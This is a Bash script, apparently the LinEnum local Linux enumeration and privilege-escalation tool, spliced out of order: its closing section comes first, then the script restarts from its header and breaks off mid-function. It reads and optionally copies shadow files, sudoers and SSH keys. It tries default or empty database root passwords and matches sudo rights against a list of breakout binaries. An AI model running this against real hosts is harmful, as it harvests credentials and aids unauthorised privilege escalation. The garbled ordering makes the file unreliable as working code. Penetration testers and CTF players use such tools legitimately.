#specific checks - check to see if we're in a docker container
dockercontainer=` grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`
if [ "$dockercontainer" ]; then
  echo -e "\e[00;33m[+] Looks like we're in a Docker container:\e[00m\n$dockercontainer" 
  echo -e "\n"
fi

#specific checks - check to see if we're a docker host
dockerhost=`docker --version 2>/dev/null; docker ps -a 2>/dev/null`
if [ "$dockerhost" ]; then
  echo -e "\e[00;33m[+] Looks like we're hosting Docker:\e[00m\n$dockerhost" 
  echo -e "\n"
fi

#specific checks - are we a member of the docker group
dockergrp=`id | grep -i docker 2>/dev/null`
if [ "$dockergrp" ]; then
  echo -e "\e[00;33m[+] We're a member of the (docker) group - could possibly misuse these rights!\e[00m\n$dockergrp" 
  echo -e "\n"
fi

#specific checks - are there any docker files present
dockerfiles=`find / -name Dockerfile -exec ls -l {} 2>/dev/null \;`
if [ "$dockerfiles" ]; then
  echo -e "\e[00;31m[-] Anything juicy in the Dockerfile:\e[00m\n$dockerfiles" 
  echo -e "\n"
fi

#specific checks - are there any docker files present
dockeryml=`find / -name docker-compose.yml -exec ls -l {} 2>/dev/null \;`
if [ "$dockeryml" ]; then
  echo -e "\e[00;31m[-] Anything juicy in docker-compose.yml:\e[00m\n$dockeryml" 
  echo -e "\n"
fi
}

lxc_container_checks()
{

#specific checks - are we in an lxd/lxc container
lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`
if [ "$lxccontainer" ]; then
  echo -e "\e[00;33m[+] Looks like we're in a lxc container:\e[00m\n$lxccontainer"
  echo -e "\n"
fi

#specific checks - are we a member of the lxd group
lxdgroup=`id | grep -i lxd 2>/dev/null`
if [ "$lxdgroup" ]; then
  echo -e "\e[00;33m[+] We're a member of the (lxd) group - could possibly misuse these rights!\e[00m\n$lxdgroup"
  echo -e "\n"
fi
}

footer()
{
echo -e "\e[00;33m### SCAN COMPLETE ####################################\e[00m" 
}

call_each()
{
  header
  debug_info
  system_info
  user_info
  environmental_info
  job_info
  networking_info
  services_info
  software_configs
  interesting_files
  docker_checks
  lxc_container_checks
  footer
}

while getopts "h:k:r:e:st" option; do
 case "${option}" in
    k) keyword=${OPTARG};;
    r) report=${OPTARG}"-"`date +"%d-%m-%y"`;;
    e) export=${OPTARG};;
    s) sudopass=1;;
    t) thorough=1;;
    h) usage; exit;;
    *) usage; exit;;
 esac
done

call_each | tee -a $report 2> /dev/null
#EndOfScript#!/bin/bash
#A script to enumerate local information from a Linux host
version="version 0.982"
#@rebootuser

#help function
usage () 
{ 
echo -e "\n\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;31m#\e[00m" "\e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m" "\e[00;31m#\e[00m"
echo -e "\e[00;31m#########################################################\e[00m"
echo -e "\e[00;33m# www.rebootuser.com | @rebootuser \e[00m"
echo -e "\e[00;33m# $version\e[00m\n"
echo -e "\e[00;33m# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t \e[00m\n"

		echo "OPTIONS:"
		echo "-k	Enter keyword"
		echo "-e	Enter export location"
		echo "-s 	Supply user password for sudo checks (INSECURE)"
		echo "-t	Include thorough (lengthy) tests"
		echo "-r	Enter report name" 
		echo "-h	Displays this help text"
		echo -e "\n"
		echo "Running with no options = limited scans/no output file"
		
echo -e "\e[00;31m#########################################################\e[00m"		
}
header()
{
echo -e "\n\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;31m#\e[00m" "\e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m" "\e[00;31m#\e[00m" 
echo -e "\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;33m# www.rebootuser.com\e[00m" 
echo -e "\e[00;33m# $version\e[00m\n" 

}

debug_info()
{
echo "[-] Debug Info" 

if [ "$keyword" ]; then 
	echo "[+] Searching for the keyword $keyword in conf, php, ini and log files" 
fi

if [ "$report" ]; then 
	echo "[+] Report name = $report" 
fi

if [ "$export" ]; then 
	echo "[+] Export location = $export" 
fi

if [ "$thorough" ]; then 
	echo "[+] Thorough tests = Enabled" 
else 
	echo -e "\e[00;33m[+] Thorough tests = Disabled\e[00m" 
fi

sleep 2

if [ "$export" ]; then
  mkdir $export 2>/dev/null
  format=$export/LinEnum-export-`date +"%d-%m-%y"`
  mkdir $format 2>/dev/null
fi

if [ "$sudopass" ]; then 
  echo -e "\e[00;35m[+] Please enter password - INSECURE - really only for CTF use!\e[00m"
  read -s userpassword
  echo 
fi

who=`whoami` 2>/dev/null 
echo -e "\n" 

echo -e "\e[00;33mScan started at:"; date 
echo -e "\e[00m\n" 
}

# useful binaries (thanks to https://gtfobins.github.io/)
binarylist='aria2c\|arp\|ash\|awk\|base64\|bash\|busybox\|cat\|chmod\|chown\|cp\|csh\|curl\|cut\|dash\|date\|dd\|diff\|dmsetup\|docker\|ed\|emacs\|env\|expand\|expect\|file\|find\|flock\|fmt\|fold\|ftp\|gawk\|gdb\|gimp\|git\|grep\|head\|ht\|iftop\|ionice\|ip$\|irb\|jjs\|jq\|jrunscript\|ksh\|ld.so\|ldconfig\|less\|logsave\|lua\|make\|man\|mawk\|more\|mv\|mysql\|nano\|nawk\|nc\|netcat\|nice\|nl\|nmap\|node\|od\|openssl\|perl\|pg\|php\|pic\|pico\|python\|readelf\|rlwrap\|rpm\|rpmquery\|rsync\|ruby\|run-parts\|rvim\|scp\|script\|sed\|setarch\|sftp\|sh\|shuf\|socat\|sort\|sqlite3\|ssh$\|start-stop-daemon\|stdbuf\|strace\|systemctl\|tail\|tar\|taskset\|tclsh\|tee\|telnet\|tftp\|time\|timeout\|ul\|unexpand\|uniq\|unshare\|vi\|vim\|watch\|wget\|wish\|xargs\|xxd\|zip\|zsh'

system_info()
{
echo -e "\e[00;33m### SYSTEM ##############################################\e[00m" 

#basic kernel info
unameinfo=`uname -a 2>/dev/null`
if [ "$unameinfo" ]; then
  echo -e "\e[00;31m[-] Kernel information:\e[00m\n$unameinfo" 
  echo -e "\n" 
fi

procver=`cat /proc/version 2>/dev/null`
if [ "$procver" ]; then
  echo -e "\e[00;31m[-] Kernel information (continued):\e[00m\n$procver" 
  echo -e "\n" 
fi

#search all *-release files for version info
release=`cat /etc/*-release 2>/dev/null`
if [ "$release" ]; then
  echo -e "\e[00;31m[-] Specific release information:\e[00m\n$release" 
  echo -e "\n" 
fi

#target hostname info
hostnamed=`hostname 2>/dev/null`
if [ "$hostnamed" ]; then
  echo -e "\e[00;31m[-] Hostname:\e[00m\n$hostnamed" 
  echo -e "\n" 
fi
}

user_info()
{
echo -e "\e[00;33m### USER/GROUP ##########################################\e[00m" 

#current user details
currusr=`id 2>/dev/null`
if [ "$currusr" ]; then
  echo -e "\e[00;31m[-] Current user/group info:\e[00m\n$currusr" 
  echo -e "\n"
fi

#last logged on user information
lastlogedonusrs=`lastlog 2>/dev/null |grep -v "Never" 2>/dev/null`
if [ "$lastlogedonusrs" ]; then
  echo -e "\e[00;31m[-] Users that have previously logged onto the system:\e[00m\n$lastlogedonusrs" 
  echo -e "\n" 
fi

#who else is logged on
loggedonusrs=`w 2>/dev/null`
if [ "$loggedonusrs" ]; then
  echo -e "\e[00;31m[-] Who else is logged on:\e[00m\n$loggedonusrs" 
  echo -e "\n"
fi

#lists all id's and respective group(s)
grpinfo=`for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null`
if [ "$grpinfo" ]; then
  echo -e "\e[00;31m[-] Group memberships:\e[00m\n$grpinfo"
  echo -e "\n"
fi

#added by phackt - look for adm group (thanks patrick)
adm_users=$(echo -e "$grpinfo" | grep "(adm)")
if [[ ! -z $adm_users ]];
  then
    echo -e "\e[00;31m[-] It looks like we have some admin users:\e[00m\n$adm_users"
    echo -e "\n"
fi

#checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)
hashesinpasswd=`grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null`
if [ "$hashesinpasswd" ]; then
  echo -e "\e[00;33m[+] It looks like we have password hashes in /etc/passwd!\e[00m\n$hashesinpasswd" 
  echo -e "\n"
fi

#contents of /etc/passwd
readpasswd=`cat /etc/passwd 2>/dev/null`
if [ "$readpasswd" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/passwd:\e[00m\n$readpasswd" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/passwd $format/etc-export/passwd 2>/dev/null
fi

#checks to see if the shadow file can be read
readshadow=`cat /etc/shadow 2>/dev/null`
if [ "$readshadow" ]; then
  echo -e "\e[00;33m[+] We can read the shadow file!\e[00m\n$readshadow" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readshadow" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/shadow $format/etc-export/shadow 2>/dev/null
fi

#checks to see if /etc/master.passwd can be read - BSD 'shadow' variant
readmasterpasswd=`cat /etc/master.passwd 2>/dev/null`
if [ "$readmasterpasswd" ]; then
  echo -e "\e[00;33m[+] We can read the master.passwd file!\e[00m\n$readmasterpasswd" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readmasterpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/master.passwd $format/etc-export/master.passwd 2>/dev/null
fi

#all root accounts (uid 0)
superman=`grep -v -E "^#" /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}' 2>/dev/null`
if [ "$superman" ]; then
  echo -e "\e[00;31m[-] Super user account(s):\e[00m\n$superman"
  echo -e "\n"
fi

#pull out vital sudoers info
sudoers=`grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v "#" 2>/dev/null`
if [ "$sudoers" ]; then
  echo -e "\e[00;31m[-] Sudoers configuration (condensed):\e[00m$sudoers"
  echo -e "\n"
fi

if [ "$export" ] && [ "$sudoers" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/sudoers $format/etc-export/sudoers 2>/dev/null
fi

#can we sudo without supplying a password
sudoperms=`echo '' | sudo -S -l -k 2>/dev/null`
if [ "$sudoperms" ]; then
  echo -e "\e[00;33m[+] We can sudo without supplying a password!\e[00m\n$sudoperms" 
  echo -e "\n"
fi

#check sudo perms - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudoauth=`echo $userpassword | sudo -S -l -k 2>/dev/null`
      if [ "$sudoauth" ]; then
        echo -e "\e[00;33m[+] We can sudo when supplying a password!\e[00m\n$sudoauth" 
        echo -e "\n"
      fi
    fi
fi

##known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values) - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudopermscheck=`echo $userpassword | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null|sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
      if [ "$sudopermscheck" ]; then
        echo -e "\e[00;33m[-] Possible sudo pwnage!\e[00m\n$sudopermscheck" 
        echo -e "\n"
      fi
    fi
fi

#known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values)
sudopwnage=`echo '' | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$sudopwnage" ]; then
  echo -e "\e[00;33m[+] Possible sudo pwnage!\e[00m\n$sudopwnage" 
  echo -e "\n"
fi

#who has sudoed in the past
whohasbeensudo=`find /home -name .sudo_as_admin_successful 2>/dev/null`
if [ "$whohasbeensudo" ]; then
  echo -e "\e[00;31m[-] Accounts that have recently used sudo:\e[00m\n$whohasbeensudo" 
  echo -e "\n"
fi

#checks to see if roots home directory is accessible
rthmdir=`ls -ahl /root/ 2>/dev/null`
if [ "$rthmdir" ]; then
  echo -e "\e[00;33m[+] We can read root's home directory!\e[00m\n$rthmdir" 
  echo -e "\n"
fi

#displays /home directory permissions - check if any are lax
homedirperms=`ls -ahl /home/ 2>/dev/null`
if [ "$homedirperms" ]; then
  echo -e "\e[00;31m[-] Are permissions on /home directories lax:\e[00m\n$homedirperms" 
  echo -e "\n"
fi

#looks for files we can write to that don't belong to us
if [ "$thorough" = "1" ]; then
  grfilesall=`find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$grfilesall" ]; then
    echo -e "\e[00;31m[-] Files not owned by user but writable by group:\e[00m\n$grfilesall" 
    echo -e "\n"
  fi
fi

#looks for files that belong to us
if [ "$thorough" = "1" ]; then
  ourfilesall=`find / -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$ourfilesall" ]; then
    echo -e "\e[00;31m[-] Files owned by our user:\e[00m\n$ourfilesall"
    echo -e "\n"
  fi
fi

#looks for hidden files
if [ "$thorough" = "1" ]; then
  hiddenfiles=`find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$hiddenfiles" ]; then
    echo -e "\e[00;31m[-] Hidden files:\e[00m\n$hiddenfiles"
    echo -e "\n"
  fi
fi

#looks for world-reabable files within /home - depending on number of /home dirs & files, this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
wrfileshm=`find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null`
	if [ "$wrfileshm" ]; then
		echo -e "\e[00;31m[-] World-readable files within /home:\e[00m\n$wrfileshm" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wrfileshm" ]; then
		mkdir $format/wr-files/ 2>/dev/null
		for i in $wrfileshm; do cp --parents $i $format/wr-files/ ; done 2>/dev/null
	fi
fi

#lists current user's home directory contents
if [ "$thorough" = "1" ]; then
homedircontents=`ls -ahl ~ 2>/dev/null`
	if [ "$homedircontents" ] ; then
		echo -e "\e[00;31m[-] Home directory contents:\e[00m\n$homedircontents" 
		echo -e "\n" 
	fi
fi

#checks for if various ssh files are accessible - this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
sshfiles=`find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) -exec ls -la {} 2>/dev/null \;`
	if [ "$sshfiles" ]; then
		echo -e "\e[00;31m[-] SSH keys/host information found in the following locations:\e[00m\n$sshfiles" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$sshfiles" ]; then
		mkdir $format/ssh-files/ 2>/dev/null
		for i in $sshfiles; do cp --parents $i $format/ssh-files/; done 2>/dev/null
	fi
fi

#is root permitted to login via ssh
sshrootlogin=`grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print  $2}'`
if [ "$sshrootlogin" = "yes" ]; then
  echo -e "\e[00;31m[-] Root is allowed to login via SSH:\e[00m" ; grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" 
  echo -e "\n"
fi
}

environmental_info()
{
echo -e "\e[00;33m### ENVIRONMENTAL #######################################\e[00m" 

#env information
envinfo=`env 2>/dev/null | grep -v 'LS_COLORS' 2>/dev/null`
if [ "$envinfo" ]; then
  echo -e "\e[00;31m[-] Environment information:\e[00m\n$envinfo" 
  echo -e "\n"
fi

#check if selinux is enabled
sestatus=`sestatus 2>/dev/null`
if [ "$sestatus" ]; then
  echo -e "\e[00;31m[-] SELinux seems to be present:\e[00m\n$sestatus"
  echo -e "\n"
fi

#phackt

#current path configuration
pathinfo=`echo $PATH 2>/dev/null`
if [ "$pathinfo" ]; then
  pathswriteable=`ls -ld $(echo $PATH | tr ":" " ")`
  echo -e "\e[00;31m[-] Path information:\e[00m\n$pathinfo" 
  echo -e "$pathswriteable"
  echo -e "\n"
fi

#lists available shells
shellinfo=`cat /etc/shells 2>/dev/null`
if [ "$shellinfo" ]; then
  echo -e "\e[00;31m[-] Available shells:\e[00m\n$shellinfo" 
  echo -e "\n"
fi

#current umask value with both octal and symbolic output
umaskvalue=`umask -S 2>/dev/null & umask 2>/dev/null`
if [ "$umaskvalue" ]; then
  echo -e "\e[00;31m[-] Current umask value:\e[00m\n$umaskvalue" 
  echo -e "\n"
fi

#umask value as in /etc/login.defs
umaskdef=`grep -i "^UMASK" /etc/login.defs 2>/dev/null`
if [ "$umaskdef" ]; then
  echo -e "\e[00;31m[-] umask value as specified in /etc/login.defs:\e[00m\n$umaskdef" 
  echo -e "\n"
fi

#password policy information as stored in /etc/login.defs
logindefs=`grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null`
if [ "$logindefs" ]; then
  echo -e "\e[00;31m[-] Password and storage information:\e[00m\n$logindefs" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$logindefs" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/login.defs $format/etc-export/login.defs 2>/dev/null
fi
}

job_info()
{
echo -e "\e[00;33m### JOBS/TASKS ##########################################\e[00m" 

#are there any cron jobs configured
cronjobs=`ls -la /etc/cron* 2>/dev/null`
if [ "$cronjobs" ]; then
  echo -e "\e[00;31m[-] Cron jobs:\e[00m\n$cronjobs" 
  echo -e "\n"
fi

#can we manipulate these jobs in any way
cronjobwwperms=`find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$cronjobwwperms" ]; then
  echo -e "\e[00;33m[+] World-writable cron jobs and file contents:\e[00m\n$cronjobwwperms" 
  echo -e "\n"
fi

#contab contents
crontabvalue=`cat /etc/crontab 2>/dev/null`
if [ "$crontabvalue" ]; then
  echo -e "\e[00;31m[-] Crontab contents:\e[00m\n$crontabvalue" 
  echo -e "\n"
fi

crontabvar=`ls -la /var/spool/cron/crontabs 2>/dev/null`
if [ "$crontabvar" ]; then
  echo -e "\e[00;31m[-] Anything interesting in /var/spool/cron/crontabs:\e[00m\n$crontabvar" 
  echo -e "\n"
fi

anacronjobs=`ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null`
if [ "$anacronjobs" ]; then
  echo -e "\e[00;31m[-] Anacron jobs and associated file permissions:\e[00m\n$anacronjobs" 
  echo -e "\n"
fi

anacrontab=`ls -la /var/spool/anacron 2>/dev/null`
if [ "$anacrontab" ]; then
  echo -e "\e[00;31m[-] When were jobs last executed (/var/spool/anacron contents):\e[00m\n$anacrontab" 
  echo -e "\n"
fi

#pull out account names from /etc/passwd and see if any users have associated cronjobs (priv command)
cronother=`cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null`
if [ "$cronother" ]; then
  echo -e "\e[00;31m[-] Jobs held by all users:\e[00m\n$cronother" 
  echo -e "\n"
fi

# list systemd timers
if [ "$thorough" = "1" ]; then
  # include inactive timers in thorough mode
  systemdtimers="$(systemctl list-timers --all 2>/dev/null)"
  info=""
else
  systemdtimers="$(systemctl list-timers 2>/dev/null |head -n -1 2>/dev/null)"
  # replace the info in the output with a hint towards thorough mode
  info="\e[2mEnable thorough tests to see inactive timers\e[00m"
fi
if [ "$systemdtimers" ]; then
  echo -e "\e[00;31m[-] Systemd timers:\e[00m\n$systemdtimers\n$info"
  echo -e "\n"
fi

}

networking_info()
{
echo -e "\e[00;33m### NETWORKING  ##########################################\e[00m" 

#nic information
nicinfo=`/sbin/ifconfig -a 2>/dev/null`
if [ "$nicinfo" ]; then
  echo -e "\e[00;31m[-] Network and IP info:\e[00m\n$nicinfo" 
  echo -e "\n"
fi

#nic information (using ip)
nicinfoip=`/sbin/ip a 2>/dev/null`
if [ ! "$nicinfo" ] && [ "$nicinfoip" ]; then
  echo -e "\e[00;31m[-] Network and IP info:\e[00m\n$nicinfoip" 
  echo -e "\n"
fi

arpinfo=`arp -a 2>/dev/null`
if [ "$arpinfo" ]; then
  echo -e "\e[00;31m[-] ARP history:\e[00m\n$arpinfo" 
  echo -e "\n"
fi

arpinfoip=`ip n 2>/dev/null`
if [ ! "$arpinfo" ] && [ "$arpinfoip" ]; then
  echo -e "\e[00;31m[-] ARP history:\e[00m\n$arpinfoip" 
  echo -e "\n"
fi

#dns settings
nsinfo=`grep "nameserver" /etc/resolv.conf 2>/dev/null`
if [ "$nsinfo" ]; then
  echo -e "\e[00;31m[-] Nameserver(s):\e[00m\n$nsinfo" 
  echo -e "\n"
fi

nsinfosysd=`systemd-resolve --status 2>/dev/null`
if [ "$nsinfosysd" ]; then
  echo -e "\e[00;31m[-] Nameserver(s):\e[00m\n$nsinfosysd" 
  echo -e "\n"
fi

#default route configuration
defroute=`route 2>/dev/null | grep default`
if [ "$defroute" ]; then
  echo -e "\e[00;31m[-] Default route:\e[00m\n$defroute" 
  echo -e "\n"
fi

#default route configuration
defrouteip=`ip r 2>/dev/null | grep default`
if [ ! "$defroute" ] && [ "$defrouteip" ]; then
  echo -e "\e[00;31m[-] Default route:\e[00m\n$defrouteip" 
  echo -e "\n"
fi

#listening TCP
tcpservs=`netstat -ntpl 2>/dev/null`
if [ "$tcpservs" ]; then
  echo -e "\e[00;31m[-] Listening TCP:\e[00m\n$tcpservs" 
  echo -e "\n"
fi

tcpservsip=`ss -t -l -n 2>/dev/null`
if [ ! "$tcpservs" ] && [ "$tcpservsip" ]; then
  echo -e "\e[00;31m[-] Listening TCP:\e[00m\n$tcpservsip" 
  echo -e "\n"
fi

#listening UDP
udpservs=`netstat -nupl 2>/dev/null`
if [ "$udpservs" ]; then
  echo -e "\e[00;31m[-] Listening UDP:\e[00m\n$udpservs" 
  echo -e "\n"
fi

udpservsip=`ss -u -l -n 2>/dev/null`
if [ ! "$udpservs" ] && [ "$udpservsip" ]; then
  echo -e "\e[00;31m[-] Listening UDP:\e[00m\n$udpservsip" 
  echo -e "\n"
fi
}

services_info()
{
echo -e "\e[00;33m### SERVICES #############################################\e[00m" 

#running processes
psaux=`ps aux 2>/dev/null`
if [ "$psaux" ]; then
  echo -e "\e[00;31m[-] Running processes:\e[00m\n$psaux" 
  echo -e "\n"
fi

#lookup process binary path and permissisons
procperm=`ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null`
if [ "$procperm" ]; then
  echo -e "\e[00;31m[-] Process binaries and associated permissions (from above list):\e[00m\n$procperm" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$procperm" ]; then
procpermbase=`ps aux 2>/dev/null | awk '{print $11}' | xargs -r ls 2>/dev/null | awk '!x[$0]++' 2>/dev/null`
  mkdir $format/ps-export/ 2>/dev/null
  for i in $procpermbase; do cp --parents $i $format/ps-export/; done 2>/dev/null
fi

#anything 'useful' in inetd.conf
inetdread=`cat /etc/inetd.conf 2>/dev/null`
if [ "$inetdread" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/inetd.conf:\e[00m\n$inetdread" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$inetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/inetd.conf $format/etc-export/inetd.conf 2>/dev/null
fi

#very 'rough' command to extract associated binaries from inetd.conf & show permisisons of each
inetdbinperms=`awk '{print $7}' /etc/inetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$inetdbinperms" ]; then
  echo -e "\e[00;31m[-] The related inetd binary permissions:\e[00m\n$inetdbinperms" 
  echo -e "\n"
fi

xinetdread=`cat /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdread" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/xinetd.conf:\e[00m\n$xinetdread" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$xinetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/xinetd.conf $format/etc-export/xinetd.conf 2>/dev/null
fi

xinetdincd=`grep "/etc/xinetd.d" /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdincd" ]; then
  echo -e "\e[00;31m[-] /etc/xinetd.d is included in /etc/xinetd.conf - associated binary permissions are listed below:\e[00m"; ls -la /etc/xinetd.d 2>/dev/null 
  echo -e "\n"
fi

#very 'rough' command to extract associated binaries from xinetd.conf & show permisisons of each
xinetdbinperms=`awk '{print $7}' /etc/xinetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$xinetdbinperms" ]; then
  echo -e "\e[00;31m[-] The related xinetd binary permissions:\e[00m\n$xinetdbinperms" 
  echo -e "\n"
fi

initdread=`ls -la /etc/init.d 2>/dev/null`
if [ "$initdread" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ binary permissions:\e[00m\n$initdread" 
  echo -e "\n"
fi

#init.d files NOT belonging to root!
initdperms=`find /etc/init.d/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initdperms" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ files not belonging to root:\e[00m\n$initdperms" 
  echo -e "\n"
fi

rcdread=`ls -la /etc/rc.d/init.d 2>/dev/null`
if [ "$rcdread" ]; then
  echo -e "\e[00;31m[-] /etc/rc.d/init.d binary permissions:\e[00m\n$rcdread" 
  echo -e "\n"
fi

#init.d files NOT belonging to root!
rcdperms=`find /etc/rc.d/init.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$rcdperms" ]; then
  echo -e "\e[00;31m[-] /etc/rc.d/init.d files not belonging to root:\e[00m\n$rcdperms" 
  echo -e "\n"
fi

usrrcdread=`ls -la /usr/local/etc/rc.d 2>/dev/null`
if [ "$usrrcdread" ]; then
  echo -e "\e[00;31m[-] /usr/local/etc/rc.d binary permissions:\e[00m\n$usrrcdread" 
  echo -e "\n"
fi

#rc.d files NOT belonging to root!
usrrcdperms=`find /usr/local/etc/rc.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$usrrcdperms" ]; then
  echo -e "\e[00;31m[-] /usr/local/etc/rc.d files not belonging to root:\e[00m\n$usrrcdperms" 
  echo -e "\n"
fi

initread=`ls -la /etc/init/ 2>/dev/null`
if [ "$initread" ]; then
  echo -e "\e[00;31m[-] /etc/init/ config file permissions:\e[00m\n$initread"
  echo -e "\n"
fi

# upstart scripts not belonging to root
initperms=`find /etc/init \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initperms" ]; then
   echo -e "\e[00;31m[-] /etc/init/ config files not belonging to root:\e[00m\n$initperms"
   echo -e "\n"
fi

systemdread=`ls -lthR /lib/systemd/ 2>/dev/null`
if [ "$systemdread" ]; then
  echo -e "\e[00;31m[-] /lib/systemd/* config file permissions:\e[00m\n$systemdread"
  echo -e "\n"
fi

# systemd files not belonging to root
systemdperms=`find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$systemdperms" ]; then
   echo -e "\e[00;33m[+] /lib/systemd/* config files not belonging to root:\e[00m\n$systemdperms"
   echo -e "\n"
fi
}

software_configs()
{
echo -e "\e[00;33m### SOFTWARE #############################################\e[00m" 

#sudo version - check to see if there are any known vulnerabilities with this
sudover=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null`
if [ "$sudover" ]; then
  echo -e "\e[00;31m[-] Sudo version:\e[00m\n$sudover" 
  echo -e "\n"
fi

#mysql details - if installed
mysqlver=`mysql --version 2>/dev/null`
if [ "$mysqlver" ]; then
  echo -e "\e[00;31m[-] MYSQL version:\e[00m\n$mysqlver" 
  echo -e "\n"
fi

#checks to see if root/root will get us a connection
mysqlconnect=`mysqladmin -uroot -proot version 2>/dev/null`
if [ "$mysqlconnect" ]; then
  echo -e "\e[00;33m[+] We can connect to the local MYSQL service with default root/root credentials!\e[00m\n$mysqlconnect" 
  echo -e "\n"
fi

#mysql version details
mysqlconnectnopass=`mysqladmin -uroot version 2>/dev/null`
if [ "$mysqlconnectnopass" ]; then
  echo -e "\e[00;33m[+] We can connect to the local MYSQL service as 'root' and without a password!\e[00m\n$mysqlconnectnopass" 
  echo -e "\n"
fi

#postgres details - if installed
postgver=`psql -V 2>/dev/null`
if [ "$postgver" ]; then
  echo -e "\e[00;31m[-] Postgres version:\e[00m\n$postgver" 
  echo -e "\n"
fi

#checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this
postcon1=`psql -U postgres -w template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon1" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'postgres' with no password!:\e[00m\n$postcon1" 
  echo -e "\n"
fi

postcon11=`psql -U postgres -w template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon11" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'postgres' with no password!:\e[00m\n$postcon11" 
  echo -e "\n"
fi

postcon2=`psql -U pgsql -w template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon2" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'psql' with no password!:\e[00m\n$postcon2" 
  echo -e "\n"
fi

postcon22=`psql -U pgsql -w template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon22" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'psql' with no password!:\e[00m\n$postcon22" 
  echo -e "\n"
fi

#apache details - if installed
apachever=`apache2 -v 2>/dev/null; httpd -v 2>/dev/null`
if [ "$apachever" ]; then
  echo -e "\e[00;31m[-] Apache version:\e[00m\n$apachever" 
  echo -e "\n"
fi

#what account is apache running under
